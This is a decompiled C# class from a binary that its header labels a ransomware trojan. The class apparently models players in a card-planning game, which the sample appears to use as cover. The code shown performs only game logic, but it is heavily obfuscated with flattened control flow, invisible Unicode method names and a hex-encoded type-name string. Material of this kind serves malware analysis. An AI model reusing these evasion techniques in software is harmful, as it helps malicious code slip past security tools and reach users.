// Decompiled with JetBrains decompiler
// Type: Cytotechnologist.Player
// Assembly: DESCUNI, Version=2.0.4.0, Culture=neutral, PublicKeyToken=null
// MVID: AF116ADB-6018-4560-80A5-0C66813DC3F1
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.02-msil\HEUR-Trojan-Ransom.MSIL.Blocker.gen-4f6383c6ae7c88ff6ab189dc208b3f159d87b824011a697f438a218fc07fa3bb.exe

using SimpleJSON;
using System.Runtime.InteropServices;

namespace Cytotechnologist
{
  public class Player
  {
    public static string MembershipCondition(int BaseStream)
    {
      string str1 = (string) null;
      bool flag = BaseStream == 0;
label_1:
      int num1 = 168385200;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1748823075)) % 11U)
        {
          case 0:
            num1 = (int) num2 * -809217012 ^ 177271176;
            continue;
          case 1:
            str2 = str1;
            num1 = 1017878566;
            continue;
          case 2:
            num1 = (int) num2 * 290515151 ^ -125892328;
            continue;
          case 3:
            int num3;
            num1 = num3 = BaseStream != 1 ? 920428512 : (num3 = 1129058610);
            continue;
          case 4:
            goto label_1;
          case 5:
            num1 = (int) num2 * 1392750415 ^ -1316924930;
            continue;
          case 6:
            str1 = "384270";
            num1 = (int) num2 * 121340929 ^ -755080064;
            continue;
          case 7:
            str1 = "456E756D657261626C65546F4974657261626C654164617074";
            num1 = (int) num2 * -335865485 ^ 2001450922;
            continue;
          case 8:
            num1 = (int) num2 * -162482124 ^ 1352621942;
            continue;
          case 10:
            int num4 = !flag ? 2071376469 : (num4 = 642846654);
            num1 = num4 ^ (int) num2 * 1191798157;
            continue;
          default:
            goto label_12;
        }
      }
label_12:
      return str2;
    }

    public string Name { get; private set; }

    private int[] PlanningCards { get; set; }

    public bool UseOneMorePlanningSprint { get; private set; }

    public int PlannedForCard(int cardTypeIndex)
    {
      if (this.PlanningCards.Length != 0)
        goto label_4;
label_1:
      int num1 = 394439088;
label_2:
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 305158462)) % 4U)
        {
          case 1:
            num1 = (int) num2 * 171301771 ^ 326583497;
            continue;
          case 2:
            goto label_3;
          case 3:
            goto label_1;
          default:
            goto label_7;
        }
      }
label_3:
      int num3 = 0;
      goto label_5;
label_7:
      int num4;
      return num4;
label_4:
      num3 = this.PlanningCards[cardTypeIndex];
label_5:
      num4 = num3;
      num1 = 579319635;
      goto label_2;
    }

    public int PlanningCardsCount
    {
      get
      {
        int num1 = 0;
label_1:
        int num2 = 1958851374;
        int index;
        int[] planningCards;
        int num3;
        int planningCardsCount;
        while (true)
        {
          uint num4;
          switch ((num4 = (uint) (num2 ^ 265960663)) % 12U)
          {
            case 0:
              index = 0;
              num2 = (int) num4 * 1626993307 ^ -1897158532;
              continue;
            case 1:
              ++index;
              num2 = (int) num4 * 1573393324 ^ 384857408;
              continue;
            case 2:
              num3 = planningCards[index];
              num2 = 1983797612;
              continue;
            case 3:
              int num5;
              num2 = num5 = index < planningCards.Length ? 96401025 : (num5 = 1832349455);
              continue;
            case 4:
              planningCardsCount = num1;
              num2 = (int) num4 * 1000751463 ^ 1364488431;
              continue;
            case 5:
              num2 = (int) num4 * -10569609 ^ -1503203919;
              continue;
            case 6:
              ++num1;
              num2 = (int) num4 * 1479383718 ^ -743427496;
              continue;
            case 7:
              int num6 = num3 > 0 ? 1792001952 : (num6 = 974597597);
              num2 = num6 ^ (int) num4 * 1649222771;
              continue;
            case 9:
              planningCards = this.PlanningCards;
              num2 = (int) num4 * 1934814755 ^ -818000708;
              continue;
            case 10:
              goto label_1;
            case 11:
              num2 = 2132442890;
              continue;
            default:
              goto label_13;
          }
        }
label_13:
        return planningCardsCount;
      }
    }

    private Player()
    {
    }

    public string PlanningCardsToString()
    {
      string str1 = " ";
      int index = 0;
label_9:
      bool flag1 = index < this.PlanningCards.Length;
      int num1 = -2073809673;
      int planningCard;
      bool flag2;
      string str2;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1395011423)) % 12U)
        {
          case 0:
            str2 = str1;
            num1 = (int) num2 * 440819681 ^ -1634794686;
            continue;
          case 2:
            planningCard = this.PlanningCards[index];
            flag2 = planningCard == 0;
            num1 = (int) num2 * -1377970796 ^ 498280906;
            continue;
          case 3:
            num1 = -1125171512;
            continue;
          case 4:
            num1 = (int) num2 * 643863915 ^ 1444486343;
            continue;
          case 5:
            num1 = -277914581;
            continue;
          case 6:
            int num3 = flag1 ? 1434374790 : (num3 = 1391025531);
            num1 = num3 ^ (int) num2 * -1691703819;
            continue;
          case 7:
            int num4 = flag2 ? -1796068582 : (num4 = -2144223486);
            num1 = num4 ^ (int) num2 * -1707080111;
            continue;
          case 8:
            str1 = Player.\u206B‮⁪⁬‭‬‫​‏‌‏⁮‎‪‍⁭⁪⁯⁬⁪⁭⁬‭‫⁫⁭⁮‬‭⁪​‭‏‪⁬⁪‫‏‏‌‮(new string[5]
            {
              str1,
              Card.CardTypeNames[index],
              "x",
              planningCard.ToString(),
              " "
            });
            num1 = -2080434561;
            continue;
          case 9:
            goto label_9;
          case 10:
            ++index;
            num1 = -1791033552;
            continue;
          case 11:
            num1 = (int) num2 * 1175574949 ^ -1667843893;
            continue;
          default:
            goto label_13;
        }
      }
label_13:
      return str2;
    }

    public static Player Deserialize(JSONNode json)
    {
      Player player = new Player()
      {
        Name = json["name"].Value,
        PlanningCards = Player.ParsePlanningCards(json["planning-cards"]),
        UseOneMorePlanningSprint = json["use-one-more-planning-sprint"].AsBool
      };
label_1:
      int num1 = -870817518;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1865949443)) % 3U)
        {
          case 1:
            num1 = (int) num2 * 1429502619 ^ -797639792;
            continue;
          case 2:
            goto label_1;
          default:
            goto label_4;
        }
      }
label_4:
      return player;
    }

    private static int[] ParsePlanningCards(JSONNode json)
    {
label_1:
      int num1 = 1920298327;
      int count;
      int aIndex;
      int[] numArray;
      int[] planningCards;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 423056501)) % 9U)
        {
          case 1:
            numArray[aIndex] = json[aIndex].AsInt;
            num1 = 1668831201;
            continue;
          case 2:
            goto label_1;
          case 3:
            count = json.Count;
            num1 = (int) num2 * 28760347 ^ 535988564;
            continue;
          case 4:
            planningCards = numArray;
            num1 = (int) num2 * 564264654 ^ 1304020165;
            continue;
          case 5:
            numArray = new int[count];
            aIndex = 0;
            num1 = (int) num2 * -1755079750 ^ -1200605605;
            continue;
          case 6:
            int num3;
            num1 = num3 = aIndex >= count ? 1437830206 : (num3 = 236995273);
            continue;
          case 7:
            ++aIndex;
            num1 = (int) num2 * -1420051713 ^ 2059722177;
            continue;
          case 8:
            num1 = (int) num2 * -1580224240 ^ -1033952939;
            continue;
          default:
            goto label_10;
        }
      }
label_10:
      return planningCards;
    }

    public override string ToString()
    {
label_1:
      int num1 = -666976097;
      string str;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -1214526050)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
            str = Player.\u206A⁮​⁪​⁪⁫‪‏‌⁬‪⁯‫‏‭‌‌​⁬⁮‫⁬‪‫‫‍‬‎‏⁭‭‌⁭‬⁪⁬⁪⁫‭‮("name: {0},\nplanning-cards: [{1}]\nuse-one-more-planning-sprint: {2}", (object) this.Name, (object) this.PlanningCardsToString(), (object) this.UseOneMorePlanningSprint);
            num1 = (int) num2 * -1781559736 ^ -1348005924;
            continue;
          case 2:
            num1 = (int) num2 * 814019677 ^ -551245241;
            continue;
          default:
            goto label_5;
        }
      }
label_5:
      return str;
    }

    static string \u206B‮⁪⁬‭‬‫​‏‌‏⁮‎‪‍⁭⁪⁯⁬⁪⁭⁬‭‫⁫⁭⁮‬‭⁪​‭‏‪⁬⁪‫‏‏‌‮([In] string[] obj0) => string.Concat(obj0);

    static string \u206A⁮​⁪​⁪⁫‪‏‌⁬‪⁯‫‏‭‌‌​⁬⁮‫⁬‪‫‫‍‬‎‏⁭‭‌⁭‬⁪⁬⁪⁫‭‮(
      [In] string obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object obj3)
    {
      return string.Format(obj0, obj1, obj2, obj3);
    }
  }
}
